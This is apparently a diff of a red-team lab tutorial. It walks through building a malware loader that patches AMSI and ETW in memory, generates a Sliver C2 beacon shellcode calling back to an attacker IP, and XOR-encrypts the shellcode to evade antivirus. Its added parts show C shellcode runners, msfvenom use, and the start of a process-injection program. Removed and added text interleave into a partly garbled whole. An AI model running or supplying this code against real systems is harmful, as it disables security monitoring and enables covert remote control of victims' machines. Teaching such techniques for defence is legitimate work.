-- Download a script, run it directly in PowerShell
-- Decode malicious code at runtime
-- Never write anything to disk
-
-File-based antivirus couldn't catch these "fileless" attacks because there was no file to scan.
-
-**Microsoft's solution: AMSI**
-
-AMSI (Antimalware Scan Interface) was introduced in Windows 10. It allows applications to request antimalware scans of ANY content - not just files on disk.
-
-**In plain English:** AMSI is like a security checkpoint inside PowerShell itself. Even if your malicious script never touched the hard drive, PowerShell asks Defender "is this script safe?" before running it.
-
-## 7.2: How AMSI Works - The Technical Flow
-
-When you type a command in PowerShell or run a script:
-
-```
-YOU TYPE: Invoke-Mimikatz
-
-   PowerShell receives the command
-         |
-         v
-   PowerShell calls AMSI: "Is 'Invoke-Mimikatz' safe?"
-         |
-         v
-   AMSI receives the script content
-         |
-         v
-   AMSI asks Windows Defender to scan the content
-         |
-         v
-   Defender returns: "This contains known malware!"
-         |
-         v
-   AMSI tells PowerShell: "BLOCK IT"
-         |
-         v
-   PowerShell: "This script contains malicious content..."
-```
-
-**What applications use AMSI:**
-- PowerShell
-- Windows Script Host (VBScript, JScript)
-- .NET runtime (assemblies loaded into memory)
-- Office VBA macros
-- JavaScript in web browsers (limited)
-
-## 7.3: The AMSI DLL - Where It Lives
-
-AMSI is implemented in a DLL file called `amsi.dll`. This file is loaded into processes that want to use AMSI.
-
-**Key function: AmsiScanBuffer**
-
-This is the function that actually performs the scan. Its job:
-1. Receive content (script, assembly, etc.)
-2. Pass it to the antimalware provider (Defender)
-3. Return the verdict (clean, malware, suspicious)
-
-**The function signature:**
-```c
-HRESULT AmsiScanBuffer(
-    HAMSICONTEXT amsiContext,    // AMSI session context
-    PVOID buffer,                // Content to scan (the script)
-    ULONG length,                // Length of content
-    LPCWSTR contentName,         // Name/identifier
-    HAMSISESSION amsiSession,    // Session handle
-    AMSI_RESULT *result          // OUTPUT: The verdict
-);
-```
-
-**Brief:** "Hey Defender, here's some content. Is it malware?"
-
-## 7.4: How We Bypass AMSI (The Key Technique)
-
-**The critical insight:** AMSI runs in the same process as our code (User Mode). It's in the same memory space. We can reach in and MODIFY it.
-
-This is powerful. AMSI is supposed to protect us, but because it runs in User Mode, attackers in that same process can mess with it.
-
-**The bypass strategy:**
-
-We overwrite the beginning of the `AmsiScanBuffer` function with instructions that immediately return "clean," without actually scanning anything.
-
-**Step by step breakdown:**
-
-1.  **Load amsi.dll** using LoadLibrary
-    -   This puts AMSI's code into our process memory
-
-2.  **Find AmsiScanBuffer** using GetProcAddress
-    -   This gives us the exact memory address of the scanning function
-
-3.  **Change memory protection** using VirtualProtect
-    -   By default, code memory is read-only
-    -   We make it writable so we can modify it
-
-4.  **Write our patch** - bytes that mean "return success immediately"
-    -   We overwrite the function's first few bytes
-
-5.  **AMSI is now blind** - every scan returns "clean"
-    -   Any future AMSI scan will hit our patch first
-
-**What patch bytes do we write?**
-
-We write a few bytes that represent CPU instructions:
-
-```
-Bytes                     ->    Assembly Instruction
---------------------------------------------------------
-0xB8 0x57 0x00 0x07 0x80  ->    mov eax, 0x80070057
-0xC3                      ->    ret
-```
-
-**What does this do at the CPU level?**
-
--   `mov eax, 0x80070057` - Put the value 0x80070057 into register EAX
--   `ret` - Return from the function immediately (go back to caller)
-
-The function never scans anything! It just puts a value in EAX and returns.
-
-**Why 0x80070057?**
-
-This is the Windows error code `E_INVALIDARG`. When AmsiScanBuffer returns this, the calling application (like PowerShell) thinks "AMSI failed gracefully, but it's not malware, so let it through."
-
-**Attack outcome:** We replace AMSI's brain with code that instantly says "everything is fine."
-
-## 7.5: AMSI Bypass in C# Code
-
-Here's the code we'll use in our loader:
-
-```csharp
-static void PatchAMSI()
-{
-    // Step 1: Load amsi.dll
-    IntPtr hAmsi = LoadLibrary("amsi.dll");
+#include <windows.h>
+#include <stdio.h>
+
+// Shellcode bytes go here
+unsigned char shellcode[] = 
+"\x90\x90\x90\x90"   // NOP NOP NOP NOP (placeholder)
+"\xcc"               // INT3 (breakpoint - will crash debugger)
+"\xc3";              // RET (return)
+
+int main() {
+    printf("Shellcode size: %d bytes\n", sizeof(shellcode));
+    printf("Shellcode at: %p\n", shellcode);
     
-    // Step 2: Find AmsiScanBuffer address
-    IntPtr pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
-    
-    // Step 3: Make the memory writable
-    uint oldProtect;
-    VirtualProtect(pAmsiScanBuffer, 6, 0x40, out oldProtect);
-    
-    // Step 4: Write our patch
-    // 0xB8 = mov eax, ...
-    // 0x57 0x00 0x07 0x80 = 0x80070057 (E_INVALIDARG)
-    // 0xC3 = ret
-    byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
-    
-    // Done! AMSI is now disabled for this process
-}
-```
-
-After this runs, any AMSI scan in our process returns "clean."
-
----
-
-# PART 8: What is ETW {#part-8-etw}
-
-ETW is another technology that can expose our activities. Let's understand and bypass it.
-
-## 8.1: What Problem ETW Solves (For Defenders)
-
-**ETW = Event Tracing for Windows**
-
-ETW is Windows' built-in system for logging what happens on the computer. It's been around since Windows 2000 but became crucial for security in modern Windows.
-
-**What gets logged via ETW:**
-- Process creation and termination
-- Network connections
-- Registry modifications
-- File system changes
-- .NET assembly loading
-- PowerShell commands
-- And hundreds of other events
-
-**In plain English:** ETW is like security cameras recording everything that happens in a building.
-
-## 8.2: Why ETW is a Problem for Attackers
-
-**Even if you bypass AMSI, ETW still sees you.**
-
-Example scenario:
-1. You bypass AMSI successfully
-2. You run Invoke-Mimikatz in PowerShell
-3. AMSI doesn't block it (we patched it)
-4. BUT... the PowerShell ETW provider logs that you ran Invoke-Mimikatz
-5. That log goes to Windows Event Log or to the EDR
-6. A security analyst or automated detection sees it
-7. You're caught
-
-**The key insight:** AMSI is real-time blocking. ETW is logging for later analysis. We need to defeat both.
-
-## 8.3: How ETW Works - The Technical Flow
-
-```
-YOUR MALWARE RUNS
-        |
-        | Does something (loads assembly, runs command)
-        v
-.NET RUNTIME / POWERSHELL
-        |
-        | Calls ETW to log the event
-        v
-EtwEventWrite() function in ntdll.dll
-        |
-        | Writes event to ETW session
-        v
-ETW CONSUMERS (Event Log, EDR, SIEM)
-        |
-        | Receive and process the event
-        v
-ALERT: "Suspicious activity detected!"
-```
-
-**The key function: EtwEventWrite**
-
-All ETW events go through this function in ntdll.dll. If we can disable this function, no events get logged.
-
-## 8.4: How We Bypass ETW
-
-**Same approach as AMSI:** Patch the function to do nothing.
-
-**The patch:**
-
-We write a single byte at the start of EtwEventWrite:
-```
-0xC3    â†’    ret (return immediately)
-```
-
-This makes EtwEventWrite return without doing anything. No events get logged.
-
-**ETW Bypass in C# Code:**
-
-```csharp
-static void PatchETW()
-{
-    // Get handle to ntdll.dll (always loaded)
-    IntPtr hNtdll = LoadLibrary("ntdll.dll");
-    
-    // Find EtwEventWrite
-    IntPtr pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
-    
-    // Make it writable
-    uint oldProtect;
-    VirtualProtect(pEtwEventWrite, 1, 0x40, out oldProtect);
-    
-    // Write 'ret' instruction
-    Marshal.WriteByte(pEtwEventWrite, 0xC3);
-    
-    // Done! ETW logging is disabled for this process
-}
-```
-
-After this runs, our process doesn't generate ETW events - no logging of our malicious activities.
-
-## 8.5: Why Both AMSI and ETW Bypasses are Needed
-
-| Security Feature | What it does | If we don't bypass |
-|------------------|--------------|-------------------|
-| **AMSI** | Blocks known malicious scripts | Our PowerShell commands get blocked |
-| **ETW** | Logs activities for later analysis | Even if not blocked, we get logged and detected later |
-
-**Our bypass order:**
-1. Patch AMSI first (so our patching code doesn't get blocked)
-2. Patch ETW second (so the AMSI patching isn't logged)
-3. Now we can run our actual payload safely
-
----
-
-# PART 9: What is Shellcode {#part-9-shellcode}
-
-Now let's understand what we're actually delivering - shellcode.
-
-## 9.1: What is Shellcode?
-
-**Definition:**
-
-Shellcode is raw machine code (CPU instructions) that's designed to be injected and executed in a running process.
-
-**In plain English:** Shellcode is the actual "payload" - the instructions that do something useful (or malicious) like connecting to our server.
-
-**Why is it called "shellcode"?**
-
-Historically, this type of code was used in exploits to spawn a command shell. The attacker would exploit a vulnerability and inject code that opened a shell (command prompt). The name stuck, even though modern shellcode does much more than spawn shells.
-
-## 9.2: How Shellcode Differs from Normal Programs
-
-| Aspect | Normal Program (.exe) | Shellcode |
-|--------|----------------------|-----------|
-| Format | PE format with headers, sections | Raw bytes, no format |
-| Size | Kilobytes to megabytes | Usually bytes to kilobytes |
-| Dependencies | Loads DLLs, uses imports | Self-contained or resolves at runtime |
-| Execution | Windows loader runs it | Must be injected and started manually |
-| Position | Loaded at expected address | Works at any address (position-independent) |
-
-**Key property: Position-Independent**
-
-Normal programs are compiled to run at a specific memory address. Shellcode doesn't know where it will be loaded, so it's written to work at ANY address. This is called "position-independent code."
-
-## 9.3: Where Does Shellcode Come From?
-
-**For our attack, we generate shellcode from Sliver:**
-
-```bash
-# On Kali, in Sliver console:
-generate beacon --http 192.168.100.100:443 --format shellcode --save /tmp/beacon.bin
-```
-
-This generates raw bytes that:
-1. When executed, connect back to our Sliver server
-2. Establish an encrypted communication channel
-3. Allow us to run commands on the target
-
-**The shellcode contains everything needed:** network code, encryption, protocol handling - all in a compact blob of bytes.
-
-## 9.4: Why We Encrypt Shellcode
-
-**The problem:**
-
-Sliver shellcode (and Cobalt Strike, Metasploit, etc.) has known signatures. Security vendors have analyzed these tools and added their patterns to signature databases.
-
-If we use the raw shellcode, Defender recognizes it:
-```
-"I see bytes that match Sliver beacon signature â†’ BLOCKED"
-```
-
-**The solution: Encryption**
-
-We encrypt the shellcode before embedding it in our loader:
-```python
-# XOR encryption (simple but effective for static bypass)
-encrypted = []
-for byte in shellcode:
-    encrypted.append(byte ^ 0x35)  # XOR with key 0x35
-```
-
-Now the bytes are scrambled. Defender sees random-looking data, not Sliver signatures.
-
-**At runtime:**
-Our loader decrypts the shellcode (XOR again with the same key), copies it to executable memory, and runs it.
-
-## 9.5: The Complete Shellcode Execution Flow
-
-```
-1. ENCRYPTED SHELLCODE (in our loader)
-   Looks random, bypasses static detection
-         |
-         v
-2. LOADER STARTS, PATCHES AMSI
-   AMSI can't block our script operations
-         |
-         v
-3. LOADER PATCHES ETW
-   No logging of our activities
-         |
-         v
-4. LOADER ALLOCATES RWX MEMORY
-   VirtualAlloc with PAGE_EXECUTE_READWRITE
-         |
-         v
-5. LOADER DECRYPTS SHELLCODE
-   XOR each byte with the key
-         |
-         v
-6. LOADER COPIES SHELLCODE TO MEMORY
-         |
-         v
-7. LOADER CREATES THREAD AT SHELLCODE
-   CreateThread with lpStartAddress = shellcode address
-         |
-         v
-8. SHELLCODE EXECUTES
-   Connects to our C2 server
-         |
-         v
-9. WE HAVE A SHELL!
-```
-
----
-
-*[END OF PORTION 2]*
-
-**Portion 2 covered:**
----
-
-# PART 10: What is Command & Control (C2) {#part-10-c2}
-
-Now we understand the technical foundations. Let's understand the tool we'll use to control our compromised targets.
-
-## 10.1: What is C2?
-
-**Definition:**
-
-C2 (Command and Control) is the infrastructure that attackers use to communicate with and control compromised systems.
-
-**In plain English:** When malware runs on a victim's computer, it needs to "phone home" to the attacker. The C2 server is the "home" it calls and the "brain" that sends commands.
-
-## 10.2: The C2 Architecture
-
-```
-+-----------------+
-|  YOU (Attacker) |
-|  On Kali Linux  |
-+--------+--------+
-         |
-         | You interact with the C2 console
-         v
-+---------------------------------------------+
-|           SLIVER C2 SERVER                  |
-|         (Running on Kali Linux)             |
-|                                             |
-|  * Listens for incoming connections         |
-|  * Receives data from implants              |
-|  * Sends commands to implants               |
-|  * Manages multiple compromised machines    |
-+---------------------------------------------+
-         |
-         | HTTPS connections (looks like normal web traffic)
-         v
-+---------------------------------------------+
-|           VICTIM MACHINES                   |
-|        (Running our shellcode)              |
-|                                             |
-|  * Execute commands from C2                 |
-|  * Send results back to C2                  |
-|  * Beacon periodically (check in)           |
-+---------------------------------------------+
-```
-
-## 10.3: Types of C2 Communication
-
-**Beacon (what we'll use):**
-- The implant "checks in" periodically (e.g., every 60 seconds)
-- If the C2 has commands waiting, the implant receives and executes them
-- Results are sent back on the next check-in
-- Looks like normal HTTPS traffic
-- Hard to detect because traffic is infrequent and encrypted
-
-**Interactive/Session:**
-- Real-time back-and-forth communication
-- More powerful but easier to detect (constant traffic)
-- Used for active post-exploitation
-
-## 10.4: Why Sliver?
-
-**Sliver** is an open-source C2 framework developed by Bishop Fox. We use it because:
-
-| Feature | Why it matters |
-|---------|---------------|
-| **Open source** | Free, no licensing issues like Cobalt Strike |
-| **Modern** | Active development, evades current defenses |
-| **HTTPS support** | Traffic looks like normal web browsing |
-| **Shellcode generation** | Can output raw shellcode for our loader |
-| **Multi-platform** | Works on Windows, Linux, macOS |
-| **Operator-friendly** | Good CLI interface |
-
-**Alternative C2 frameworks you might encounter:**
-- Cobalt Strike (commercial, very popular, $3,500/year)
-- Metasploit (open source, widely detected)
-- Havoc (open source, modern)
-- Mythic (open source, modular)
-
----
-
-# PART 11: Setting Up Sliver C2 on Kali Linux {#part-11-sliver}
-
-Let's set up Sliver step by step on your Kali Linux machine.
-
-## 11.1: Your Lab Environment
-
-**Before you start, confirm your network:**
-
-| Machine | Role | IP Address |
-|---------|------|------------|
-| **Kali Linux** | Attacker (you) | 192.168.100.100 |
-| **DC01** | Domain Controller | 192.168.100.10 |
-| **WS01** | Workstation (target) | 192.168.100.20 |
-| **WS02** | Workstation (target) | 192.168.100.30 |
-
-Make sure your Kali can ping the Windows machines.
-
-## 11.2: Update Kali Linux
-
-**First, update your system packages:**
-
-```bash
-# Update package lists
-sudo apt update
-
-# Upgrade installed packages
-sudo apt upgrade -y
-```
-
-**What is apt?**
-
-`apt` is the package manager for Debian-based Linux systems (including Kali). It downloads and installs software from online repositories.
-
-- `apt update` - Downloads the latest list of available packages
-- `apt upgrade` - Upgrades all installed packages to latest versions
-- `apt install <package>` - Installs a new package
-
-## 11.3: Installing Sliver
-
-**Method 1: Direct Download (Recommended)**
-
-Sliver provides a one-liner installation script:
-
-```bash
-# Download and run the installer
-curl https://sliver.sh/install | sudo bash
-```
-
-**What does this do?**
-1. Downloads the Sliver binary for your architecture
-2. Installs it to `/root/sliver-server` or `/usr/local/bin/sliver`
-3. Sets up necessary permissions
-
-**Method 2: Using apt (if available)**
-
-Some Kali versions have Sliver in repositories:
-
-```bash
-sudo apt install sliver -y
-```
-
-**Method 3: Manual Download**
-
-If the above methods don't work:
-
-```bash
-# Go to home directory
-cd ~
-
-# Download latest release (check GitHub for current version)
-wget https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux -O sliver-server
-
-# Make it executable
-chmod +x sliver-server
-
-# Move to a system location (optional)
-sudo mv sliver-server /usr/local/bin/
-```
-
-## 11.4: Installing .NET SDK (For Building Our Loader)
-
-Our loader will be written in C#. We need the .NET SDK to compile it.
-
-**Install .NET SDK:**
-
-```bash
-# Add Microsoft package repository
-wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
-sudo dpkg -i packages-microsoft-prod.deb
-rm packages-microsoft-prod.deb
-
-# Update and install .NET SDK
-sudo apt update
-sudo apt install -y dotnet-sdk-8.0
-```
-
-**Verify installation:**
-
-```bash
-dotnet --version
-# Should show something like: 8.0.xxx
-```
-
-**What is the .NET SDK?**
-
-The .NET SDK (Software Development Kit) includes:
-- The C# compiler (to turn our code into an executable)
-- The .NET runtime (to run .NET applications)
-- Tools for building and publishing applications
-
-## 11.5: Starting Sliver
-
-**Start the Sliver server:**
-
-```bash
-# If installed via script
-sliver-server
-
-# If you have the binary in current directory
-./sliver-server
-```
-
-**What you should see:**
-
-```
-    ____  _     _____     _______ ____  
-   / ___|| |   |_ _\ \   / / ____|  _ \ 
-   \___ \| |    | | \ \ / /|  _| | |_) |
-    ___) | |___ | |  \ V / | |___|  _ < 
-   |____/|_____|___|  \_/  |_____|_| \_\
-
-All hackers gain mass
-[*] Server v1.5.41 - abc123def456
-[*] Welcome to the sliver shell, please type 'help' for options
-
-sliver >
-```
-
-You're now in the Sliver console!
-
-## 11.6: Setting Up an HTTPS Listener
-
-**A listener waits for incoming connections from implants.**
-
-```bash
-# In the Sliver console:
-https -l 192.168.100.100 -p 443
-```
-
-**Breaking down the command:**
-- `https` - Start an HTTPS listener (encrypted, looks like web traffic)
-- `-l 192.168.100.100` - Listen on this IP (your Kali's IP)
-- `-p 443` - Listen on port 443 (standard HTTPS port)
-
-**What you should see:**
-
-```
-[*] Starting HTTPS listener ...
-[*] Successfully started job #1
-```
-
-**Verify the listener is running:**
-
-```bash
-sliver > jobs
-```
-
-**Output:**
-
-```
- ID   Name   Protocol   Port   
-==== ====== ========== ======
- 1    https   tcp       443
-```
-
-## 11.7: Generating Shellcode
-
-**Now let's generate the shellcode that our loader will execute.**
-
-```bash
-sliver > generate beacon --http 192.168.100.100:443 --os windows --arch amd64 --format shellcode --save /tmp/beacon.bin
-```
-
-**Breaking down the command:**
-
-| Option | What it does |
-|--------|-------------|
-| `generate beacon` | Create a beacon implant (periodic check-in) |
-| `--http 192.168.100.100:443` | Connect to our C2 via HTTPS on port 443 |
-| `--os windows` | Target Windows operating system |
-| `--arch amd64` | Target 64-bit architecture |
-| `--format shellcode` | Output raw shellcode (not an .exe) |
-| `--save /tmp/beacon.bin` | Save to this file |
-
-**What you should see:**
-
-```
-[*] Generating new windows/amd64 beacon implant binary
-[*] Build completed in 45s
-[*] Shellcode written to /tmp/beacon.bin (123456 bytes)
-```
-
-**Verify the file was created:**
-
-```bash
-# Exit Sliver temporarily (or open a new terminal)
-ls -la /tmp/beacon.bin
-
-# Check the size
-wc -c /tmp/beacon.bin
-```
-
-## 11.8: Encrypting the Shellcode
-
-**We encrypt the shellcode so it doesn't match signatures.**
-
-Create a Python script to encrypt:
-
-```bash
-nano /tmp/encrypt_shellcode.py
-```
-
-Paste this code:
-
-```python
-#!/usr/bin/env python3
-"""
-Shellcode Encryptor - XOR encryption
-This encrypts shellcode so it doesn't match antivirus signatures.
-"""
-
-import sys
-
-def xor_encrypt(data, key):
-    """XOR each byte with the key"""
-    return bytes([b ^ key for b in data])
-
-def main():
-    if len(sys.argv) != 3:
-        print("Usage: python3 encrypt_shellcode.py <input_file> <output_file>")
-        print("Example: python3 encrypt_shellcode.py beacon.bin beacon_encrypted.bin")
-        sys.exit(1)
-    
-    input_file = sys.argv[1]
-    output_file = sys.argv[2]
-    xor_key = 0x35  # Our encryption key - remember this!
-    
-    # Read the raw shellcode
-    with open(input_file, 'rb') as f:
-        shellcode = f.read()
-    
-    print(f"[*] Read {len(shellcode)} bytes from {input_file}")
-    
-    # Encrypt it
-    encrypted = xor_encrypt(shellcode, xor_key)
-    
-    # Write encrypted shellcode
-    with open(output_file, 'wb') as f:
-        f.write(encrypted)
-    
-    print(f"[*] Encrypted shellcode written to {output_file}")
-    print(f"[*] XOR key used: 0x{xor_key:02x}")
-    print(f"[*] Remember: use the same key (0x{xor_key:02x}) in your loader!")
-    
-    # Also output as C# byte array for convenience
-    cs_output = output_file.replace('.bin', '.cs')
-    with open(cs_output, 'w') as f:
-        f.write("// Encrypted shellcode - paste this into your loader\n")
-        f.write("byte[] encryptedShellcode = new byte[] {\n    ")
-        for i, b in enumerate(encrypted):
-            f.write(f"0x{b:02x}")
-            if i < len(encrypted) - 1:
-                f.write(", ")
-            if (i + 1) % 12 == 0:
-                f.write("\n    ")
-        f.write("\n};\n")
-    
-    print(f"[*] C# byte array written to {cs_output}")
-
-if __name__ == "__main__":
-    main()
-```
-
-**Run the encryption script:**
-
-```bash
-python3 /tmp/encrypt_shellcode.py /tmp/beacon.bin /tmp/beacon_encrypted.bin
-```
-
-**Output:**
-
-```
-[*] Read 123456 bytes from /tmp/beacon.bin
-[*] Encrypted shellcode written to /tmp/beacon_encrypted.bin
-[*] XOR key used: 0x35
-[*] Remember: use the same key (0x35) in your loader!
-[*] C# byte array written to /tmp/beacon_encrypted.cs
-```
-
-Now you have:
-- `/tmp/beacon_encrypted.bin` - Encrypted shellcode (binary)
-- `/tmp/beacon_encrypted.cs` - C# byte array ready to paste
-
----
-
-# PART 12: Building Our Complete Loader {#part-12-loader}
-
-Now let's build the actual malware loader that will bypass Defender and execute our shellcode.
-
-**What is a "Loader" and why do we need it?**
-
-A loader is a small program whose job is to:
-1. Receive our shellcode (which is just raw bytes)
-2. Prepare the memory to execute it
-3. Tell the CPU to start running it
-
-Why can't we just run the shellcode directly? Because shellcode is just data (bytes). Windows won't execute random bytes unless we specifically set things up to do so.
-
-**Our loader will do these steps:**
-
-```
-STEP 1: Patch AMSI
-         |
-         | (So Defender can't scan our script content)
-         v
-STEP 2: Patch ETW
-         |
-         | (So no logs are recorded of our activities)
-         v
-STEP 3: Decrypt shellcode
-         |
-         | (The encrypted bytes become executable code)
-         v
-STEP 4: Allocate executable memory
-         |
-         | (Get RAM that we can write AND execute)
-         v
-STEP 5: Copy shellcode to that memory
-         |
-         | (Put our code in the executable space)
-         v
-STEP 6: Create a thread to execute it
-         |
-         | (Tell CPU to start running our code)
-         v
-STEP 7: Shellcode runs, connects to C2
-         |
-         v
-WE HAVE A SHELL!
-```
-
-**Why does process injection work? (Deep explanation)**
-
-This is important to understand. Here is the fundamental concept:
-
-The CPU doesn't care WHERE code comes from. It just executes whatever bytes you point it to.
-
-When you run a normal program:
-1. Windows loads it from disk
-2. Windows places it in memory
-3. CPU executes it
-
-When we inject shellcode:
-1. WE place our code in memory (using VirtualAlloc)
-2. WE point the CPU at it (using CreateThread)
-3. CPU executes it
-
-The CPU doesn't know the difference! It just sees bytes at a memory address and starts executing.
-
-**Why is this a security problem?**
-
-Because any program running on Windows can:
-1. Ask for memory (VirtualAlloc)
-2. Put bytes in that memory
-3. Make that memory executable
-4. Tell the CPU to run it
-
-Antivirus tries to detect this, but we can evade detection by:
-1. Encrypting our shellcode (so it looks random)
-2. Patching AMSI (so it can't scan our content)
-3. Patching ETW (so no logs are created)
-
-**Let's build it step by step.**
-
-## 12.1: Create the Project Directory
-
-```bash
-# Create a directory for our loader
-mkdir -p ~/ad-lab/loader
-cd ~/ad-lab/loader
-
-# Create a new .NET console project
-dotnet new console -n SliverLoader -f net8.0
-cd SliverLoader
-```
-
-**What does each command do?**
-
-| Command | What it does |
-|---------|--------------|
-| `mkdir -p ~/ad-lab/loader` | Create directory structure. `-p` means "create parent dirs too" |
-| `cd ~/ad-lab/loader` | Change into that directory |
-| `dotnet new console -n SliverLoader -f net8.0` | Create a new C# project |
-| `cd SliverLoader` | Go into the project folder |
-
-**What does `dotnet new console` create?**
-
-It creates a basic C# console application with:
-- `SliverLoader.csproj` - Project file (tells .NET how to build it)
-- `Program.cs` - Main code file (this is what we'll edit)
-
-## 12.2: Understanding the Loader Code Structure
-
-Before we write the code, let me explain what each section does:
-
-| Section | Purpose | Why it's needed |
-|---------|---------|-----------------|
-| **Windows API Imports** | Defines the Windows functions we'll call | We need VirtualAlloc, CreateThread, etc. |
-| **Constants** | Defines values like page protection flags | Memory needs to be PAGE_EXECUTE_READWRITE |
-| **Encrypted Shellcode** | This is YOUR Sliver beacon shellcode | The actual code that connects to C2 |
-| **PatchAMSI function** | Disables Windows script scanning | Otherwise Defender blocks our activity |
-| **PatchETW function** | Disables Windows event logging | Otherwise our activity is logged |
-| **DecryptShellcode function** | XOR decrypts the shellcode | Converts encrypted bytes back to executable code |
-| **ExecuteShellcode function** | Runs the shellcode | Allocates memory, copies code, runs it |
-| **Main function** | Entry point, calls everything | Orchestrates the whole attack |
-
-## 12.3: The Complete Loader Code (With Detailed Comments)
-
-**Replace the contents of `Program.cs`:**
-
-```bash
-nano Program.cs
-```
-
-Delete everything and paste the following code. **I have added extensive comments explaining EVERY line:**
-
-```csharp
-/*
- * Sliver Shellcode Loader with AMSI/ETW Bypass
- * 
- * This loader:
- * 1. Patches AMSI to disable script scanning
- * 2. Patches ETW to disable logging
- * 3. Decrypts shellcode in memory
- * 4. Executes shellcode via CreateThread
- * 
- * For educational purposes in controlled lab environments only.
- */
-
-using System;
-using System.Runtime.InteropServices;
-
-class Program
-{
-    // ============================================================
-    // SECTION 1: Windows API Imports
-    // ============================================================
-    // These are the APIs we learned about in Part 3
-    
-    [DllImport("kernel32.dll")]
-    static extern IntPtr LoadLibrary(string lpFileName);
-    
-    [DllImport("kernel32.dll")]
-    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
-    
-    [DllImport("kernel32.dll")]
-    static extern IntPtr VirtualAlloc(
-        IntPtr lpAddress, 
-        uint dwSize, 
-        uint flAllocationType, 
-        uint flProtect
+    // Step 1: Allocate executable memory
+    LPVOID exec_mem = VirtualAlloc(
+        NULL,                           // Any address
+        sizeof(shellcode),              // Size
+        MEM_COMMIT | MEM_RESERVE,       // Allocate it
+        PAGE_EXECUTE_READWRITE          // RWX permissions
     );
     
-    [DllImport("kernel32.dll")]
-    static extern bool VirtualProtect(
-        IntPtr lpAddress, 
-        uint dwSize, 
-        uint flNewProtect, 
-        out uint lpflOldProtect
+    if (exec_mem == NULL) {
+        printf("VirtualAlloc failed\n");
+        return 1;
+    }
+    
+    printf("Executable memory at: %p\n", exec_mem);
+    
+    // Step 2: Copy shellcode to executable memory
+    memcpy(exec_mem, shellcode, sizeof(shellcode));
+    printf("Shellcode copied\n");
+    
+    // Step 3: Execute the shellcode
+    printf("Executing shellcode...\n");
+    
+    // Cast the memory address to a function pointer and call it
+    ((void(*)())exec_mem)();
+    
+    printf("Shellcode returned\n");
+    
+    // Clean up
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    
+    return 0;
+}
+```
+
+Compile:
+```
+cl loader.c
+```
+
+## What Each Step Does
+
+**Step 1: VirtualAlloc**
+- Allocates fresh memory
+- PAGE_EXECUTE_READWRITE means we can write to it AND execute it
+- This is the key - normally data memory is not executable
+
+**Step 2: memcpy**
+- Copies our shellcode bytes into the executable memory
+- Now the bytes are sitting in memory with execute permission
+
+**Step 3: Execute**
+- `((void(*)())exec_mem)()` is ugly but simple
+- It says: "Treat exec_mem as a function pointer and call it"
+- The CPU now executes our shellcode bytes
+
+## Hands-On: Real MessageBox Shellcode
+
+Let us use real shellcode. Generate on Kali:
+
+```bash
+msfvenom -p windows/x64/messagebox TEXT="Hacked!" TITLE="Red Team" -f c
+```
+
+Copy the output bytes and paste into the loader:
+
+```c
+#include <windows.h>
+#include <stdio.h>
+
+unsigned char shellcode[] = 
+"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+"\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+// ... paste all the bytes here
+;
+
+int main() {
+    LPVOID exec_mem = VirtualAlloc(NULL, sizeof(shellcode), 
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    
+    memcpy(exec_mem, shellcode, sizeof(shellcode));
+    ((void(*)())exec_mem)();
+    
+    VirtualFree(exec_mem, 0, MEM_RELEASE);
+    return 0;
+}
+```
+
+Compile and run - you should see a message box!
+
+## Why Defender Will Catch This
+
+If you try this with Sliver shellcode, Defender will probably catch it.
+
+Why?
+1. **Signature detection:** Defender knows what Sliver shellcode looks like
+2. **Behavioral detection:** Allocating RWX memory and executing it is suspicious
+3. **AMSI:** If using PowerShell, AMSI scans the content
+
+This is why we need evasion techniques (coming in later chapters).
+
+---
+
+# CHAPTER 29: What is Process Injection
+
+## Introduction
+
+Running shellcode in your own process works, but has problems:
+- If the user closes your program, the shellcode dies
+- Investigation finds your suspicious program easily
+- Some shellcode needs to be in a specific process
+
+**Solution:** Inject shellcode into another process!
+
+## What Process Injection Means
+
+Instead of running shellcode in your own process, you:
+1. Pick a target process (like notepad.exe or explorer.exe)
+2. Allocate memory in THAT process
+3. Write shellcode to THAT process
+4. Create a thread in THAT process that runs the shellcode
+
+Now the shellcode runs inside notepad! If someone investigates, they see notepad acting strangely.
+
+## Classic Process Injection Steps
+
+```
+┌─────────────────────┐      ┌─────────────────────┐
+│   YOUR PROCESS      │      │   TARGET PROCESS    │
+│   (injector.exe)    │      │   (notepad.exe)     │
+│                     │      │                     │
+│  1. OpenProcess() ──────────→ Get handle         │
+│                     │      │                     │
+│  2. VirtualAllocEx() ───────→ Allocate memory   │
+│                     │      │   in target         │
+│                     │      │                     │
+│  3. WriteProcessMemory() ───→ Copy shellcode    │
+│                     │      │   to target         │
+│                     │      │                     │
+│  4. CreateRemoteThread() ───→ Run shellcode!    │
+│                     │      │                     │
+└─────────────────────┘      └─────────────────────┘
+```
+
+## Hands-On: Process Injection in C
+
+```c
+#include <windows.h>
+#include <tlhelp32.h>
+#include <stdio.h>
+
+// For this example, we use harmless shellcode (NOP NOP RET)
+// In real use, this would be Sliver shellcode
+unsigned char shellcode[] = "\x90\x90\x90\xc3";
+
+// Find process ID by name
+DWORD GetProcessIdByName(const char* processName) {
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(PROCESSENTRY32);
+    
+    if (Process32First(snapshot, &pe)) {
+        do {
+            if (strcmp(pe.szExeFile, processName) == 0) {
+                CloseHandle(snapshot);
+                return pe.th32ProcessID;
+            }
+        } while (Process32Next(snapshot, &pe));
+    }
+    
+    CloseHandle(snapshot);
+    return 0;
+}
+
+int main() {
+    // Step 1: Find target process
+    DWORD targetPID = GetProcessIdByName("notepad.exe");
+    
+    if (targetPID == 0) {
+        printf("Could not find notepad.exe. Please open it first.\n");
+        return 1;
+    }
+    
+    printf("Found notepad.exe with PID: %d\n", targetPID);
+    
+    // Step 2: Open the target process
+    HANDLE hProcess = OpenProcess(
